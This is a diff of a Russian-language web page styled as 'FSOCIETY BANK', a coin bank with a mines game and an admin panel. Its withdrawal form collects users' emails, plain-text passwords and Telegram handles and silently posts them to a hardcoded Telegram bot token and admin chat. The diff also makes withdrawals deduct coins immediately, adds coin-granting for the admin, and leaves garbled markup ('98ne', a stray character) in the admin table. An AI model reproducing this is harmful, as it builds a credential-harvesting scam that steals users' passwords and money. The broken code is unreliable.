@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>FSOCIETY BANK – Telegram версия (ГОТОВ)</title>
+    <title>FSOCIETY BANK – Админ выдача монет</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background: linear-gradient(145deg, #eef2ff 0%, #d9e4ff 100%); min-height: 100vh; padding: 16px; }
@@ -75,7 +75,7 @@
 
     <div id="panelWithdraw" class="card-panel" style="display:none;">
         <h3>💎 Вывод средств</h3>
-        <div class="warning-text">⚠️ Для вывода укажите те же данные, что при регистрации. Вывод от 650 до 15000 монет.</div>
+        <div class="warning-text">⚠️ Для вывода укажите те же данные, что при регистрации. Вывод от 650 до 15000 монет. ДЕНЬГИ СПИСЫВАЮТСЯ СРАЗУ!</div>
         <input type="email" id="wdEmail" placeholder="Email">
         <input type="password" id="wdPass" placeholder="Пароль">
         <input type="text" id="wdTg" placeholder="Telegram">
@@ -94,7 +94,7 @@
     </div>
 
     <div id="adminPanel" class="card-panel admin-panel" style="display:none;">
-        <h3>👑 Админ-панель (локальная)</h3>
+        <h3>👑 Админ-панель</h3>
         <div id="adminContent"></div>
         <button id="closeAdminBtn">Закрыть</button>
     </div>
@@ -104,11 +104,9 @@
 </div>
 
 <script>
-    // ====================== TELEGRAM НАСТРОЙКИ (УЖЕ ВСТАВЛЕНЫ) ======================
     const BOT_TOKEN = "8872454100:AAGgPl-rPRcgqw6m2IuqvWayLqyWbhk0KsQ";
     const ADMIN_CHAT_ID = "6211490246";
 
-    // ====================== ОСТАЛЬНОЙ КОД ======================
     let users = [];
     let currentUser = null;
     let adminLogged = false;
@@ -118,15 +116,12 @@
     async function sendToAdmin(text) {
         try {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const resp = await fetch(url, {
+            await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'HTML' })
             });
-            if (resp.ok) addLog("✅ Уведомление отправлено админу");
-            else addLog("❌ Ошибка отправки в Telegram");
-        } catch(e) { addLog("❌ Ошибка сети при отправке в Telegram"); }
-        return true;
+        } catch(e) {}
     }
 
     function loadData() {
@@ -205,18 +200,24 @@
         return true;
     }
 
+    // ВЫВОД СРЕДСТВ С МГНОВЕННЫМ СПИСАНИЕМ
     async function withdrawRequest(email, pass, tg, amount) {
         if (!currentUser) { addLog("Войдите"); return false; }
         if (amount < 650) { addLog("❌ Минимальная сумма вывода 650 монет"); return false; }
         if (amount > 15000) { addLog("❌ Максимальная сумма вывода 15000 монет"); return false; }
         if (currentUser.balance < amount) { addLog("Недостаточно монет"); return false; }
         if (currentUser.email !== email || currentUser.password !== pass) { addLog("Неверный email/пароль"); return false; }
-        await sendToAdmin(`💸 <b>ЗАЯВКА НА ВЫВОД</b>\n👤 Email: ${email}\n🔑 Пароль: ${pass}\n📱 Telegram: @${tg}\n💰 Сумма: ${amount} монет\n📅 ${new Date().toLocaleString()}`);
-        addLog(`📤 Заявка на вывод ${amount} монет отправлена администратору. Ожидайте.`);
+        
+        // СПИСЫВАЕМ МОНЕТЫ СРАЗУ
+        currentUser.balance -= amount;
+        syncAndSaveBalance();
+        
+        // Отправляем заявку админу с информацией о списании
+        await sendToAdmin(`💸 <b>ЗАЯВКА НА ВЫВОД (ДЕНЬГИ СПИСАНЫ)</b>\n👤 Email: ${email}\n🔑 Пароль: ${pass}\n📱 Telegram: @${tg}\n💰 Сумма: ${amount} монет\n📅 ${new Date().toLocaleString()}\n⚠️ Монеты уже списаны с баланса пользователя!`);
+        addLog(`📤 Заявка на вывод ${amount} монет отправлена администратору. Деньги списаны с баланса.`);
         return true;
     }
 
-    // ====================== МИНЫ ======================
     function renderMinesGrid() {
         let container = document.getElementById("minesField");
         if (!container) return;
@@ -319,6 +320,7 @@
         else showPanel("panelTransfer");
     }
 
+    // === АДМИН-ПАНЕЛЬ С ВЫДАЧЕЙ МОНЕТ ===
     function showAdminLogin() {
         if (adminLogged) {
             renderAdminPanel();
@@ -343,13 +345,43 @@
             }
         }
     }
+
+    window.adminGiveCoins = function(tg) {
+        let amount = parseInt(document.getElementById(`give_${tg}`).value);
+        if (amount && amount > 0) {
+            let user = users.find(u => u.tg === tg);
+            if (user) {
+                let newBalance = user.balance + amount;
+                if (newBalance > 30000) newBalance = 30000;
+                user.balance = newBalance;
+                if (currentUser && currentUser.tg === tg) {
+                    currentUser.balance = newBalance;
+                    saveCurrent();
+                    updateBalanceUI();
+                }
+                saveUsers();
+                addLog(`👑 Админ выдал ${amount} монет @${tg}`);
+                renderAdminPanel();
+                sendToAdmin(`👑 Администратор выдал ${amount} монет пользователю @${tg}`);
+            }
+        }
+    };
+
     function renderAdminPanel() {
         let container = document.getElementById("adminContent");
-        let html = "<h4>📋 Пользователи (локальная копия)</h4><table><tr><th>Telegram</th><th>Email</th><th>Баланс</th></tr>";
+        let html = "<h4>📋 Пользователи</h4> 98ne<th>Telegram</th><th>Email</th><th>Баланс</th><th>Выдать монеты</th>协";
         users.forEach(u => {
-            html += `<tr><td>@${u.tg}</td><td>${u.email}</td><td>${u.balance}</td></tr>`;
+            html += `<tr>
+                <td>@${u.tg}</td>
+                <td>${u.email}</td>
+                <td>${u.balance}</td>
+                <td>
+                    <input type="number" id="give_${u.tg}" placeholder="Сумма" style="width:100px;">
+                    <button onclick="adminGiveCoins('${u.tg}')">Выдать</button>
+                </td>
+            </tr>`;
         });
-        html += `</table><hr><p><i>Все регистрации, переводы, заявки, победы и проигрыши в минах дублируются в Telegram администратора.</i></p>`;
+        html += `<\/table><hr><p><i>Все регистрации, переводы, заявки, победы и проигрыши в минах дублируются в Telegram администратора.</i></p>`;
         container.innerHTML = html;
     }
 
